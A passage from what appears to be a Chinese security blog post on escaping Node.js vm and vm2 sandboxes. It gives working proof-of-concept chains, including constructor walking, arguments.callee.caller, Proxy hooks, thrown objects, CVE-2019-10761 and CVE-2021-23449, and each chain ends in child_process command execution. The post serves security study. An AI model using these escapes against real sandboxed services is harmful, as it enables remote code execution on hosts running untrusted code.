require(\"./y1\")\n\nconsole.log(age)\n```\n\n输出：\n\n![image-20221012150333572](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121503613.png)\n\n可以发现我这次在y1中并没有使用`exports`将age导入，并且y2在输出时也没有用`a.age`，因为此时age已经挂载在global上了，它的作用域已经不在y1中了。\n\n我们输出一下global对象，可以看到age确实挂载在了global上：\n\n```json\n<ref *1> Object [global] {\n  global: [Circular *1],\n  clearInterval: [Function: clearInterval],\n  clearTimeout: [Function: clearTimeout],\n  setInterval: [Function: setInterval],\n  setTimeout: [Function: setTimeout] {\n    [Symbol(nodejs.util.promisify.custom)]: [Getter]\n  },\n  queueMicrotask: [Function: queueMicrotask],\n  performance: Performance {\n    nodeTiming: PerformanceNodeTiming {\n      name: 'node',\n      entryType: 'node',\n      startTime: 0,\n      duration: 25.98190000653267,\n      nodeStart: 0.4919999986886978,\n      v8Start: 2.0012000054121017,\n      bootstrapComplete: 18.864999994635582,\n      environment: 10.277099996805191,\n      loopStart: -1,\n      loopExit: -1,\n      idleTime: 0\n    },\n    timeOrigin: 1665558311872.296\n  },\n  clearImmediate: [Function: clearImmediate],\n  setImmediate: [Function: setImmediate] {\n    [Symbol(nodejs.util.promisify.custom)]: [Getter]\n  },\n  age: 20\n}\n```\n\n\n\n## **0x04 vm沙箱逃逸**\n\n我们在前面提到了作用域这个概念，所以我们现在思考一下，如果想要实现沙箱的隔离作用，我们是不是可以创建一个新的作用域，让代码在这个新的作用域里面去运行，这样就和其他的作用域进行了隔离，这也就是vm模块运行的原理，先来了解几个常用的vm模块的API。\n\n- `vm.runinThisContext(code)`：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。\n\n  ![](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121548200.png)\n\n```javascript\nconst vm = require('vm');\nlet localVar = 'initial value';\nconst vmResult = vm.runInThisContext('localVar = \"vm\";');\nconsole.log('vmResult:', vmResult);\nconsole.log('localVar:', localVar);\n// vmResult: 'vm', localVar: 'initial value'\n```\n\n- `vm.createContext([sandbox])`： 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。\n\n  `vm.runInContext(code, contextifiedSandbox[, options])`：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。\n\n  ![image-20221012154008522](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121540576.png)\n\n  ```javascript\n  const util = require('util');\n  const vm = require('vm');\n  global.globalVar = 3;\n  const sandbox = { globalVar: 1 };\n  vm.createContext(sandbox);\n  vm.runInContext('globalVar *= 2;', sandbox);\n  console.log(util.inspect(sandbox)); // { globalVar: 2 }\n  console.log(util.inspect(globalVar)); // 3\n  ```\n\n  - `vm.runInNewContext(code[, sandbox][, options])`: creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。\n  - `vm.Script类` vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。\n  - `new vm.Script(code, options)`：创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。\n    code：要被解析的JavaScript代码\n\n  ```javascript\n  const util = require('util');\n  const vm = require('vm');\n  const sandbox = {\n   animal: 'cat',\n   count: 2\n  };\n  const script = new vm.Script('count += 1; name = \"kitty\";');\n  const context = vm.createContext(sandbox);\n  script.runInContext(context);\n  console.log(util.inspect(sandbox));\n  // { animal: 'cat', count: 3, name: 'kitty' }\n  ```\n\n  script对象可以通过runInXXXContext运行。\n\n\n\n我们一般进行沙箱逃逸最后都是进行rce，那么在Node里要进行rce就需要procces了，在获取到process对象后我们就可以用require来导入child_process，再利用child_process执行命令。但process挂载在global上，但是我们上面说了在`creatContext`后是不能访问到global的，所以我们最终的目标是通过各种办法将global上的process引入到沙箱中。\n\n如果我们把代码改成这样（code参数最好用反引号包裹，这样可以使code更严格便于执行）：\n\n```javascript\n\"use strict\";\nconst vm = require(\"vm\");\nconst y1 = vm.runInNewContext(`this.constructor.constructor('return process.env')()`);\nconsole.log(y1);\n```\n\n![image-20221012163040569](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121630628.png)\n\n```javascript\n vm.runInNewContext(`this.constructor.constructor('return process.env')()`);\n```\n\n那么我们是怎么实现逃逸的呢，首先这里面的this指向的是当前传递给`runInNewContext`的对象，这个对象是不属于沙箱环境的，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的`()`是调用这个用Function的constructor生成的函数，最终返回了一个process对象。\n\n下面这行代码也可以达到相同的效果：\n\n```javascript\nconst y1 = vm.runInNewContext(`this.toString.constructor('return process')()`);\n```\n\n然后我们就可以通过返回的process对象来rce了\n\n```javascript\ny1.mainModule.require('child_process').execSync('whoami').toString()\n```\n\n\n\n这里知识星球上提到了一个问题，下面这段代码：\n\n```javascript\nconst vm = require('vm');\nconst script = `m + n`;\nconst sandbox = { m: 1, n: 2 };\nconst context = new vm.createContext(sandbox);\nconst res = vm.runInContext(script, context);\nconsole.log(res)\n```\n\n我们能不能把`this.toString.constructor('return process')()`中的this换成{}呢？ {}的意思是在沙箱内声明了一个对象，也就是说这个对象是不能访问到global下的。\n\n如果我们将this换成m和n也是访问不到的，因为数字，字符串，布尔这些都是primitive类型，他们在传递的过程中是将值传递过去而不是引用（类似于函数传递形参），在沙盒内使用的mn已经不是原来的mn了，所以无法利用。\n\n我们将mn改成其他类型就可以利用了：\n\n![image-20221012170835453](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121708516.png)\n\n\n\n## **0x05 vm沙箱逃逸的一些其他情况**\n\n\n\n知识星球里提到了这样的情况：\n\n```javascript\nconst vm = require('vm');\nconst script = `...`;\nconst sandbox = Object.create(null);\nconst context = vm.createContext(sandbox);\nconst res = vm.runInContext(script, context);\nconsole.log('Hello ' + res)\n```\n\n\n\n我们现在的this为null，并且也没有其他可以引用的对象，这时候想要逃逸我们要用到一个函数中的内置对象的属性`arguments.callee.caller`，它可以返回函数的调用者。\n\n我们上面演示的沙箱逃逸其实就是找到一个沙箱外的对象，并调用其中的方法，这种情况下也是一样的，我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的`arguments.callee.caller`就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了。\n\n![image-20221014171057337](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210141711421.png)\n\n\n\n我们分析一下这段代码\n\n```javascript\nconst vm = require('vm');\nconst script = \n`(() => {\n    const a = {}\n    a.toString = function () {\n      const cc = arguments.callee.caller;\n      const p = (cc.constructor.constructor('return process'))();\n      return p.mainModule.require('child_process').execSync('whoami').toString()\n    }\n    return a\n  })()`;\n\nconst sandbox = Object.create(null);\nconst context = new vm.createContext(sandbox);\nconst res = vm.runInContext(script, context);\nconsole.log('Hello ' + res)\n```\n\n我们在沙箱内先创建了一个对象，并且将这个对象的toString方法进行了重写，通过`arguments.callee.caller`获得到沙箱外的一个对象，利用这个对象的构造函数的构造函数返回了process，再调用process进行rce，沙箱外在console.log中通过字符串拼接的方式触发了这个重写后的toString函数。\n\n如果沙箱外没有执行字符串的相关操作来触发这个toString，并且也没有可以用来进行恶意重写的函数，我们可以用`Proxy`来劫持属性\n\n[Proxy 和 Reflect - 掘金 (juejin.cn)](https://juejin.cn/post/6844904090116292616)\n\n![image-20221017194803074](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210171948191.png)\n\n```javascript\nconst vm = require(\"vm\");\n\nconst script = \n`\n(() =>{\n    const a = new Proxy({}, {\n        get: function(){\n            const cc = arguments.callee.caller;\n            const p = (cc.constructor.constructor('return process'))();\n            return p.mainModule.require('child_process').execSync('whoami').toString();\n        }\n    })\n    return a\n})()\n`;\nconst sandbox = Object.create(null);\nconst context = new vm.createContext(sandbox);\nconst res = vm.runInContext(script, context);\nconsole.log(res.abc)\n```\n\n触发利用链的逻辑就是我们在`get:`这个钩子里写了一个恶意函数，当我们在沙箱外访问proxy对象的任意属性（不论是否存在）这个钩子就会自动运行，实现了rce。\n\n如果沙箱的返回值返回的是我们无法利用的对象或者没有返回值应该怎么进行逃逸呢？\n\n我们可以借助异常，将沙箱内的对象抛出去，然后在外部输出：\n\n![image-20221017195034139](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210171950196.png)\n\n```javascript\nconst vm = require(\"vm\");\n\nconst script = \n`\n    throw new Proxy({}, {\n        get: function(){\n            const cc = arguments.callee.caller;\n            const p = (cc.constructor.constructor('return process'))();\n            return p.mainModule.require('child_process').execSync('whoami').toString();\n        }\n    })\n`;\ntry {\n    vm.runInContext(script, vm.createContext(Object.create(null)));\n}catch(e) {\n    console.log(\"error:\" + e) \n} \n```\n\n这里我们用catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来。\n\n\n\n## **0x06 vm2**\n\n通过上面几个例子可以看出来vm沙箱隔离功能较弱，有很多逃逸的方法，所以第三方包vm2在vm的基础上做了一些优化，我们看一下这些优化具体是怎么实现的。\n\n安装vm2包：\n\n```shell\nnpm install vm2\n```\n\n整个vm2包下是这样的结构：\n\n![image-20221018164821223](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210181648329.png)\n\n- `cli.js`实现了可以在命令行中调用vm2 也就是bin下的vm2。\n\n- `contextify.js`封装了三个对象：`Contextify Decontextify propertyDescriptor`，并且针对global的Buffer类进行了代理。\n- `main.js` 是vm2执行的入口，导出了`NodeVM VM `这两个沙箱环境，还有一个`VMScript`实际上是封装了`vm.Script`。\n- `sandbox.js`针对global的一些函数和变量进行了拦截，比如`setTimeout，setInterval`等\n\nvm2相比vm做出很大的改进，其中之一就是利用了es6新增的proxy特性，从而使用钩子拦截对`constructor和__proto__`这些属性的访问。\n\n先用vm2演示一下：\n\n```javascript\nconst {VM, VMScript} = require('vm2');\n\nconst script = new VMScript(\"let a = 2;a;\");\n\nconsole.log((new VM()).run(script));\n```\n\n`VM`是vm2在vm的基础上封装的一个虚拟机，我们只需要实例化后调用其中的run方法就可以运行一段脚本。\n\n\n\n那么vm2在运行这两行代码时都做了什么事：\n\n![image-20221018170911509](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210181709570.png)\n\n\n\n可以发现相比于vm的沙箱环境，vm2最重要的一步就是引入`sandbox.js`并针对context做封装。\n\n那么vm2具体是怎么实现对context的封装？\n\nvm2出现过多次逃逸的问题，所以现有的代码被进行了大量修改，为了方便分析需要使用较老版本的vm2，但github上貌似将3.9以前的版本全都删除了，所以我这里也找不到对应的资源了，代码分析也比较麻烦，直接移步链接：\n\n[vm2实现原理分析-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/207283#h2-1)\n\n\n\n## **0x07 vm2中的沙箱绕过**\n\n### **CVE-2019-10761**\n\n该漏洞要求vm2版本<=3.6.10\n\n```javascript\n\"use strict\";\nconst {VM} = require('vm2');\nconst untrusted = `\nconst f = Buffer.prototype.write;\nconst ft = {\n\t\tlength: 10,\n\t\tutf8Write(){\n\t\t\t\n\t\t}\n}\nfunction r(i){\n\tvar x = 0;\n\ttry{\n\t\tx = r(i);\n\t}catch(e){}\n\tif(typeof(x)!=='number')\n\t\treturn x;\n\tif(x!==i)\n\t\treturn x+1;\n\ttry{\n\t\tf.call(ft);\n\t}catch(e){\n\t\treturn e;\n\t}\n\treturn null;\n}\nvar i=1;\nwhile(1){\n\ttry{\n\t\ti=r(i).constructor.constructor(\"return process\")();\n\t\tbreak;\n\t}catch(x){\n\t\ti++;\n\t}\n}\ni.mainModule.require(\"child_process\").execSync(\"whoami\").toString()\n`;\ntry{\n\tconsole.log(new VM().run(untrusted));\n}catch(x){\n\tconsole.log(x);\n}\n```\n\n这个链子在p牛的知识星球上有，很抽象，沙箱逃逸说到底就是要从沙箱外获取一个对象，然后获得这个对象的constructor属性，这条链子获取沙箱外对象的方法是 在沙箱内不断递归一个函数，当递归次数超过当前环境的最大值时，我们正好调用沙箱外的函数，就会导致沙箱外的调用栈被爆掉，我们在沙箱内catch这个异常对象，就拿到了一个沙箱外的对象。举个例子：\n\n假设当前环境下最大递归值为1000，我们通过程序控制递归999次（注意这里说的递归值不是一直调用同一个函数的最大值，而是单次程序内调用函数次数的最大值，也就是调用栈的最大值）：\n\n```javascript\nr(i);      // 该函数递归999次\n\nf.call(ft);    // 递归到第1000次时调用f这个函数，f为Buffer.prototype.write，就是下面图片的这个函数\n\nthis.utf8Write()   // 递归到1001次时为该函数，是一个外部函数，所以爆栈时捕捉的异常也是沙箱外，从而返回了一个沙箱\t\t\t\t\t外的异常对象\n```\n\n![image-20221018203447018](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210182034077.png)\n\n\n\n### **CVE-2021-23449**\n\n 这个漏洞在snyk解释是原型链污染导致的沙箱逃逸，但p牛在知识星球里发了其实是另外的原因\n\n[Sandbox Bypass in vm2 | CVE-2021-23449 | Snyk](https://security.snyk.io/vuln/SNYK-JS-VM2-1585918) \n\npoc：\n\n```javascript\nlet res = import('./foo.js')\nres.toString.constructor(\"return this\")().process.mainModule.require(\"child_process\").execSync(\"whoami\").toString();\n```\n\nimport()在JavaScript中是一个语法结构，不是函数，没法通过之前对require这种函数处理相同的方法来处理它，导致实际上我们调用import()的结果实际上是没有经过沙箱的，是一个外部变量。 我们再获取这个变量的属性即可绕过沙箱。 vm2对此的修复方法也很粗糙，正则匹配并替换了\\bimport\\b关键字，在编译失败的时候，报Dynamic Import not supported错误。\n\n\n\n### **知识星球上的另外一个trick**\n\n\n\n```javascript\nSymbol = {\n  get toStringTag(){\n    throw f=>f.constructor(\"return process\")()\n  }\n};\ntry{\n  Buffer.from(new Map());\n}catch(f){\n  Symbol = {};\n  f(()=>{}).mainModule.require(\"child_process\").execSync(\"whoami\").toString();\n}\n```\n\n在vm2的原理中提到vm2会为对象配置代理并初始化，如果对象是以下类型：\n\n![image-20221023152804997](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210231528122.png)\n\n就会return `Decontextify.instance` 函数，这个函数中用到了Symbol全局对象，我们可以通过劫持Symbol对象的getter并抛出异常，再在沙箱内拿到这个异常对象就可以了\n\n![image-20221023153034658](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210231530718.png)\n\n","tags":["NodeJs"],"categories":["WebSec"]}]